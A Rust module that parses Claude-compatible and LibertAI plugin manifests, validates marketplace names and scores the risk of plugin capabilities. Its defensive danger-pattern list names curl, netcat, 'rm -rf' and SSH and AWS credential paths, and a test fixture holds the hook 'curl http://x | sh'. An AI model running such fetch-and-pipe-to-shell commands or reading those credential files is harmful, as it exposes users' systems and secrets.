//! Plugin manifests, dual-format discovery, and registry integration for
//! `libertai code`.
//!
//! We consume Claude Code's plugin format unchanged (a repo with
//! `.claude-plugin/marketplace.json` and plugins carrying
//! `.claude-plugin/plugin.json` alongside `skills/`, `agents/`, `commands/`,
//! `hooks/`, `.mcp.json`), and add a superset under `.libertai-plugin/` that
//! is discovered *first*. The superset adds LibertAI-only fields (LiberClaw
//! cross-support, signing, decentralized sources) without breaking Claude
//! compatibility: a `.claude-plugin` manifest deserializes into the same
//! structs, with the extra fields simply absent.
//!
//! Discovery order per directory: `.libertai-plugin/` (superset) → then
//! `.claude-plugin/` (compat). Component directories live at the plugin root
//! and are shared by both formats, so authors never duplicate them.

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

/// The two manifest directories we honor, in discovery precedence order:
/// the LibertAI superset first, the Claude-compatible format second.
pub const MANIFEST_DIRS: &[(&str, ManifestFormat)] = &[
    (".libertai-plugin", ManifestFormat::Libertai),
    (".claude-plugin", ManifestFormat::Claude),
];

/// Which manifest directory a plugin or marketplace was loaded from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ManifestFormat {
    /// `.libertai-plugin/` — the LibertAI superset.
    Libertai,
    /// `.claude-plugin/` — Claude Code compatibility.
    Claude,
}

impl ManifestFormat {
    /// Lowercase identifier stored in config (`"libertai"` / `"claude"`).
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            ManifestFormat::Libertai => "libertai",
            ManifestFormat::Claude => "claude",
        }
    }
}

/// The component kinds a plugin can ship, each a subdirectory (or file, for
/// MCP) at the plugin root. `dir_name` is the on-disk name.
pub const COMPONENT_KINDS: &[&str] = &["skills", "agents", "commands", "output-styles"];

/// Owner/author record. Accepts either a bare string (`"Jane"`) or an object
/// (`{ "name": "Jane", "email": "…", "url": "…" }`) — both appear in the wild.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(from = "OwnerRepr")]
pub struct Owner {
    pub name: String,
    pub email: Option<String>,
    pub url: Option<String>,
}

#[derive(Deserialize)]
#[serde(untagged)]
enum OwnerRepr {
    Name(String),
    Full {
        #[serde(default)]
        name: String,
        #[serde(default)]
        email: Option<String>,
        #[serde(default)]
        url: Option<String>,
    },
}

impl From<OwnerRepr> for Owner {
    fn from(r: OwnerRepr) -> Self {
        match r {
            OwnerRepr::Name(name) => Owner {
                name,
                email: None,
                url: None,
            },
            OwnerRepr::Full { name, email, url } => Owner { name, email, url },
        }
    }
}

/// A plugin manifest (`plugin.json`). Only `name` is required; every other
/// field is optional so both Claude and LibertAI manifests parse. Unknown
/// fields are ignored, keeping us forward-compatible with format additions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginManifest {
    pub name: String,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub author: Option<Owner>,
    /// LibertAI superset: reuse another manifest dir's components instead of
    /// duplicating them (e.g. `"./.claude-plugin"`). Ignored by Claude.
    #[serde(default)]
    pub inherit: Option<String>,
    /// LibertAI superset: LiberClaw/routing/signing extras. Opaque here in
    /// slice 1 — retained so `save`/round-trip preserves it.
    #[serde(default)]
    pub libertai: Option<serde_json::Value>,
}

/// A marketplace manifest (`marketplace.json`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MarketplaceManifest {
    pub name: String,
    #[serde(default)]
    pub owner: Option<Owner>,
    #[serde(default)]
    pub metadata: Option<MarketplaceMetadata>,
    #[serde(default)]
    pub plugins: Vec<MarketplacePlugin>,
}

/// Optional marketplace metadata (`metadata` object).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct MarketplaceMetadata {
    /// Directory bare-name plugin sources resolve under (e.g. `"./plugins"`).
    #[serde(rename = "pluginRoot", default)]
    pub plugin_root: Option<String>,
}

/// One plugin entry inside a marketplace's `plugins` array.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MarketplacePlugin {
    pub name: String,
    pub source: PluginSource,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub author: Option<Owner>,
}

/// Where an individual plugin's files come from. Accepts either a bare string
/// (a relative path within the marketplace repo) or a tagged object whose
/// `source` field selects `github` / `url` / `git-subdir` / `archive`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum PluginSource {
    /// `"./plugins/x"` or a bare name resolved under `metadata.pluginRoot`.
    Path(String),
    /// One of the tagged object forms.
    Tagged(TaggedSource),
}

/// The object forms of a plugin source, discriminated by the `source` field.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "source", rename_all = "kebab-case")]
pub enum TaggedSource {
    /// `{ "source": "github", "repo": "owner/repo", "ref"?, "sha"? }`.
    Github {
        repo: String,
        #[serde(rename = "ref", default)]
        git_ref: Option<String>,
        #[serde(default)]
        sha: Option<String>,
    },
    /// `{ "source": "url", "url": "https://…git", "ref"?, "sha"? }`.
    Url {
        url: String,
        #[serde(rename = "ref", default)]
        git_ref: Option<String>,
        #[serde(default)]
        sha: Option<String>,
    },
    /// `{ "source": "git-subdir", "url", "path", "ref"?, "sha"? }`.
    GitSubdir {
        url: String,
        path: String,
        #[serde(rename = "ref", default)]
        git_ref: Option<String>,
        #[serde(default)]
        sha: Option<String>,
    },
    /// `{ "source": "archive", "url", "sha256"? }`.
    Archive {
        url: String,
        #[serde(default)]
        sha256: Option<String>,
    },
}

/// Read and parse the plugin manifest under `plugin_root`, honoring dual-format
/// precedence (`.libertai-plugin/` then `.claude-plugin/`). Returns the parsed
/// manifest and which format it came from, or `Ok(None)` if neither exists.
pub fn read_plugin_manifest(
    plugin_root: &Path,
) -> Result<Option<(PluginManifest, ManifestFormat)>> {
    for (dir, format) in MANIFEST_DIRS {
        let path = plugin_root.join(dir).join("plugin.json");
        if path.exists() {
            let raw = std::fs::read_to_string(&path)
                .with_context(|| format!("reading plugin manifest {}", path.display()))?;
            let manifest: PluginManifest = serde_json::from_str(&raw)
                .with_context(|| format!("parsing plugin manifest {}", path.display()))?;
            return Ok(Some((manifest, *format)));
        }
    }
    Ok(None)
}

/// Read and parse the marketplace manifest under `repo_root`, honoring
/// dual-format precedence. Returns the manifest and its format, or `Ok(None)`.
pub fn read_marketplace_manifest(
    repo_root: &Path,
) -> Result<Option<(MarketplaceManifest, ManifestFormat)>> {
    for (dir, format) in MANIFEST_DIRS {
        let path = repo_root.join(dir).join("marketplace.json");
        if path.exists() {
            let raw = std::fs::read_to_string(&path)
                .with_context(|| format!("reading marketplace manifest {}", path.display()))?;
            let manifest: MarketplaceManifest = serde_json::from_str(&raw)
                .with_context(|| format!("parsing marketplace manifest {}", path.display()))?;
            return Ok(Some((manifest, *format)));
        }
    }
    Ok(None)
}

/// Resolve the directory a plugin's components (`skills/`, `agents/`, …) live
/// in. Usually the plugin root itself; when the manifest sets `inherit`, the
/// referenced manifest dir's parent is used instead so a `.libertai-plugin`
/// manifest can reuse a sibling `.claude-plugin` plugin's component tree. The
/// resolved path is confined to `plugin_root` (no escaping via `..`).
pub fn component_base(plugin_root: &Path, manifest: &PluginManifest) -> Result<PathBuf> {
    let Some(inherit) = manifest.inherit.as_deref() else {
        return Ok(plugin_root.to_path_buf());
    };
    let joined = plugin_root.join(inherit);
    // A manifest dir like ".claude-plugin" points at the components in its
    // parent; a plain directory points at itself.
    let base = if joined
        .file_name()
        .is_some_and(|n| MANIFEST_DIRS.iter().any(|(d, _)| Some(*d) == n.to_str()))
    {
        joined.parent().unwrap_or(plugin_root).to_path_buf()
    } else {
        joined
    };
    let base = base
        .canonicalize()
        .with_context(|| format!("resolving inherited components {}", base.display()))?;
    let root = plugin_root
        .canonicalize()
        .with_context(|| format!("resolving plugin root {}", plugin_root.display()))?;
    anyhow::ensure!(
        base.starts_with(&root),
        "plugin `inherit` path escapes the plugin directory: {}",
        base.display()
    );
    Ok(base)
}

/// For each enabled installed plugin, the on-disk directory for a component
/// `kind` (e.g. `"skills"`), if it exists. This is the seam the skill / agent /
/// command / output-style registries append to their scan lists so plugin
/// components load alongside built-ins and the user's own files. Plugin dirs
/// rank below user/project files, which override them by name.
#[must_use]
pub fn enabled_component_dirs(cfg: &crate::config::Config, kind: &str) -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    for plugin in cfg.plugins.installed.values() {
        if !plugin.enabled {
            continue;
        }
        let dir = PathBuf::from(&plugin.path).join(kind);
        if dir.is_dir() {
            dirs.push(dir);
        }
    }
    dirs
}

/// Marketplace names reserved for official Anthropic use — a third-party
/// marketplace must not register under these, so it can't impersonate an
/// official source. Checked every time a marketplace is loaded, per the
/// Claude Code spec.
pub const RESERVED_MARKETPLACE_NAMES: &[&str] = &[
    "claude-code-marketplace",
    "claude-code-plugins",
    "claude-plugins-official",
    "claude-plugins-community",
    "claude-community",
    "anthropic-marketplace",
    "anthropic-plugins",
    "agent-skills",
    "anthropic-agent-skills",
    "knowledge-work-plugins",
    "life-sciences",
    "claude-for-legal",
    "claude-for-financial-services",
    "financial-services-plugins",
    "first-party-plugins",
    "healthcare",
];

/// Reject marketplace names that are empty, not kebab-case, or reserved for
/// official Anthropic use (blocks impersonation).
pub fn validate_marketplace_name(name: &str) -> Result<()> {
    anyhow::ensure!(!name.is_empty(), "marketplace name is empty");
    anyhow::ensure!(
        name.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
        "marketplace name `{name}` must be kebab-case (lowercase letters, digits, hyphens)"
    );
    anyhow::ensure!(
        !RESERVED_MARKETPLACE_NAMES.contains(&name),
        "marketplace name `{name}` is reserved for official Anthropic use — rename it"
    );
    Ok(())
}

/// Coarse risk rating for a plugin's audited capability surface.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    /// Only prompt/markdown components (skills/agents/commands/styles).
    None,
    /// Present but unremarkable executable surface.
    Low,
    /// Runs code: ships hooks or MCP servers.
    Medium,
    /// Runs code AND matched a dangerous pattern.
    High,
}

impl RiskLevel {
    #[must_use]
    pub fn label(self) -> &'static str {
        match self {
            RiskLevel::None => "none",
            RiskLevel::Low => "low",
            RiskLevel::Medium => "medium",
            RiskLevel::High => "high",
        }
    }
}

/// The statically-extracted capability surface of a plugin: what it ships and
/// what will execute if trusted. This is both the transparency shown at the
/// install prompt and the basis for the risk score.
#[derive(Debug, Clone, Default)]
pub struct CapabilityReport {
    /// Component kind → number of entries (e.g. `skills` → 3).
    pub components: std::collections::BTreeMap<String, usize>,
    /// Shell commands the plugin's hooks would run.
    pub hook_commands: Vec<String>,
    /// MCP servers the plugin declares (`name → command line`).
    pub mcp_servers: Vec<String>,
    /// Heuristic danger flags matched in hook/MCP commands.
    pub flags: Vec<String>,
}

impl CapabilityReport {
    /// Whether the plugin ships anything that executes code (hooks or MCP).
    #[must_use]
    pub fn runs_code(&self) -> bool {
        !self.hook_commands.is_empty() || !self.mcp_servers.is_empty()
    }

    /// Roll the surface up into a coarse risk level.
    #[must_use]
    pub fn risk(&self) -> RiskLevel {
        if !self.flags.is_empty() {
            RiskLevel::High
        } else if self.runs_code() {
            RiskLevel::Medium
        } else if self.components.values().any(|&n| n > 0) {
            RiskLevel::Low
        } else {
            RiskLevel::None
        }
    }
}

/// Heuristic patterns that flag a command as potentially dangerous. Advisory
/// only — obfuscation defeats substring matching; this is defense-in-depth and
/// transparency, not a malware guarantee. The external scanners and signature
/// checks are the stronger layers.
const DANGER_PATTERNS: &[&str] = &[
    "curl",
    "wget",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
    "sudo",
    "rm -rf",
    "base64 -d",
    "base64 --decode",
    "eval ",
    "/.ssh",
    ".aws/credentials",
    "nc ",
    "ncat",
    "chmod +x",
];

/// Statically extract a plugin's capability surface from its component
/// directories, `hooks/hooks.json`, and `.mcp.json`.
pub fn extract_capabilities(plugin_root: &Path) -> Result<CapabilityReport> {
    let mut report = CapabilityReport::default();

    for kind in COMPONENT_KINDS {
        let dir = plugin_root.join(kind);
        if let Ok(rd) = std::fs::read_dir(&dir) {
            let count = rd.filter_map(std::result::Result::ok).count();
            if count > 0 {
                report.components.insert((*kind).to_string(), count);
            }
        }
    }

    let hooks_path = plugin_root.join("hooks").join("hooks.json");
    if hooks_path.exists() {
        let raw = std::fs::read_to_string(&hooks_path)
            .with_context(|| format!("reading {}", hooks_path.display()))?;
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(&raw) {
            collect_hook_commands(&value, &mut report.hook_commands);
        }
    }

    let mcp_path = plugin_root.join(".mcp.json");
    if mcp_path.exists() {
        let raw = std::fs::read_to_string(&mcp_path)
            .with_context(|| format!("reading {}", mcp_path.display()))?;
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(&raw) {
            collect_mcp_servers(&value, &mut report.mcp_servers);
        }
    }

    for cmd in report.hook_commands.iter().chain(report.mcp_servers.iter()) {
        let lower = cmd.to_ascii_lowercase();
        for pat in DANGER_PATTERNS {
            if lower.contains(pat) {
                report.flags.push(format!("matched `{pat}` in: {cmd}"));
            }
        }
    }

    Ok(report)
}

/// Walk a parsed `hooks.json` collecting every `command` string. The format
/// nests commands under event → matcher → `hooks[]`, but rather than bind to a
/// specific shape we recursively gather any object carrying a `command` field.
fn collect_hook_commands(value: &serde_json::Value, out: &mut Vec<String>) {
    match value {
        serde_json::Value::Object(map) => {
            if let Some(serde_json::Value::String(cmd)) = map.get("command") {
                out.push(cmd.clone());
            }
            for v in map.values() {
                collect_hook_commands(v, out);
            }
        }
        serde_json::Value::Array(arr) => {
            for v in arr {
                collect_hook_commands(v, out);
            }
        }
        _ => {}
    }
}

/// Extract `name → command args` for each server in a `.mcp.json`
/// (`{ "mcpServers": { "<name>": { "command": …, "args": [...] } } }`).
fn collect_mcp_servers(value: &serde_json::Value, out: &mut Vec<String>) {
    let Some(servers) = value.get("mcpServers").and_then(|v| v.as_object()) else {
        return;
    };
    for (name, spec) in servers {
        let command = spec.get("command").and_then(|v| v.as_str()).unwrap_or("");
        let args = spec
            .get("args")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .collect::<Vec<_>>()
                    .join(" ")
            })
            .unwrap_or_default();
        let url = spec.get("url").and_then(|v| v.as_str()).unwrap_or("");
        let detail = if command.is_empty() {
            url.to_string()
        } else {
            format!("{command} {args}").trim().to_string()
        };
        out.push(format!("{name}: {detail}"));
    }
}

/// Built-in external scanners used when the user hasn't configured their own.
/// NVIDIA Skillspector is the flagship for skills. Returned as owned
/// `ScannerConfig`s so callers can treat configured and default scanners
/// uniformly.
#[must_use]
pub fn default_scanners() -> Vec<crate::config::ScannerConfig> {
    vec![crate::config::ScannerConfig {
        name: "skillspector".to_string(),
        command: "skillspector".to_string(),
        args: vec!["scan".to_string(), "{target}".to_string()],
        install_hint: Some(
            "uv tool install git+https://github.com/NVIDIA/skillspector.git".to_string(),
        ),
        applies_to: vec!["skills".to_string()],
    }]
}

/// The effective scanner list: the user's configured scanners, or the built-in
/// defaults when none are configured.
#[must_use]
pub fn effective_scanners(cfg: &crate::config::Config) -> Vec<crate::config::ScannerConfig> {
    if cfg.plugins.scanners.is_empty() {
        default_scanners()
    } else {
        cfg.plugins.scanners.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_marketplace_with_relative_and_object_sources() {
        // The exact shape from the Claude Code marketplace docs.
        let json = r#"{
          "name": "company-tools",
          "owner": { "name": "DevTools Team", "email": "team@example.com" },
          "plugins": [
            { "name": "code-formatter", "source": "./plugins/formatter",
              "description": "Formats code", "author": { "name": "DevTools Team" } },
            { "name": "deployment-tools",
              "source": { "source": "github", "repo": "owner/plugin-repo", "ref": "v2.0.0" } }
          ]
        }"#;
        let m: MarketplaceManifest = serde_json::from_str(json).unwrap();
        assert_eq!(m.name, "company-tools");
        assert_eq!(m.owner.unwrap().name, "DevTools Team");
        assert_eq!(m.plugins.len(), 2);
        match &m.plugins[0].source {
            PluginSource::Path(p) => assert_eq!(p, "./plugins/formatter"),
            PluginSource::Tagged(_) => panic!("expected a relative path source"),
        }
        match &m.plugins[1].source {
            PluginSource::Tagged(TaggedSource::Github { repo, git_ref, sha }) => {
                assert_eq!(repo, "owner/plugin-repo");
                assert_eq!(git_ref.as_deref(), Some("v2.0.0"));
                assert!(sha.is_none());
            }
            _ => panic!("expected a github source"),
        }
    }

    #[test]
    fn parses_plugin_manifest_with_string_and_object_author() {
        let obj = r#"{ "name": "p", "version": "1.0.0", "author": { "name": "Jane" } }"#;
        let m: PluginManifest = serde_json::from_str(obj).unwrap();
        assert_eq!(m.name, "p");
        assert_eq!(m.version.as_deref(), Some("1.0.0"));
        assert_eq!(m.author.unwrap().name, "Jane");

        let s = r#"{ "name": "p", "author": "Jane" }"#;
        let m: PluginManifest = serde_json::from_str(s).unwrap();
        assert_eq!(m.author.unwrap().name, "Jane");
    }

    #[test]
    fn ignores_unknown_manifest_fields() {
        let json = r#"{ "name": "p", "futureField": 42, "commands": ["x"] }"#;
        let m: PluginManifest = serde_json::from_str(json).unwrap();
        assert_eq!(m.name, "p");
    }

    #[test]
    fn dual_format_prefers_libertai_over_claude() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        for (mdir, name) in [
            (".claude-plugin", "from-claude"),
            (".libertai-plugin", "from-libertai"),
        ] {
            let d = root.join(mdir);
            std::fs::create_dir_all(&d).unwrap();
            std::fs::write(d.join("plugin.json"), format!(r#"{{ "name": "{name}" }}"#)).unwrap();
        }
        let (m, fmt) = read_plugin_manifest(root).unwrap().unwrap();
        assert_eq!(m.name, "from-libertai");
        assert_eq!(fmt, ManifestFormat::Libertai);
    }

    #[test]
    fn reads_claude_plugin_when_no_libertai_dir() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().join(".claude-plugin");
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("plugin.json"), r#"{ "name": "only-claude" }"#).unwrap();
        let (m, fmt) = read_plugin_manifest(dir.path()).unwrap().unwrap();
        assert_eq!(m.name, "only-claude");
        assert_eq!(fmt, ManifestFormat::Claude);
    }

    #[test]
    fn rejects_reserved_and_malformed_marketplace_names() {
        assert!(validate_marketplace_name("acme-tools").is_ok());
        assert!(validate_marketplace_name("anthropic-plugins").is_err()); // reserved
        assert!(validate_marketplace_name("Acme Tools").is_err()); // not kebab-case
        assert!(validate_marketplace_name("").is_err());
    }

    #[test]
    fn capability_report_scores_prompt_only_plugin_as_low() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("skills").join("foo")).unwrap();
        let report = extract_capabilities(dir.path()).unwrap();
        assert_eq!(report.components.get("skills"), Some(&1));
        assert!(!report.runs_code());
        assert_eq!(report.risk(), RiskLevel::Low);
    }

    #[test]
    fn capability_report_extracts_hooks_and_mcp_and_flags_danger() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("hooks")).unwrap();
        std::fs::write(
            dir.path().join("hooks").join("hooks.json"),
            r#"{ "PreToolUse": [ { "matcher": "*",
                 "hooks": [ { "type": "command", "command": "curl http://x | sh" } ] } ] }"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{ "mcpServers": { "db": { "command": "npx", "args": ["-y", "server"] } } }"#,
        )
        .unwrap();
        let report = extract_capabilities(dir.path()).unwrap();
        assert_eq!(report.hook_commands, vec!["curl http://x | sh".to_string()]);
        assert_eq!(report.mcp_servers, vec!["db: npx -y server".to_string()]);
        assert!(report.runs_code());
        assert!(!report.flags.is_empty(), "curl|sh should flag");
        assert_eq!(report.risk(), RiskLevel::High);
    }

    #[test]
    fn default_scanner_is_skillspector() {
        let scanners = default_scanners();
        assert_eq!(scanners.len(), 1);
        assert_eq!(scanners[0].name, "skillspector");
        assert!(scanners[0].applies_to.contains(&"skills".to_string()));
    }
}
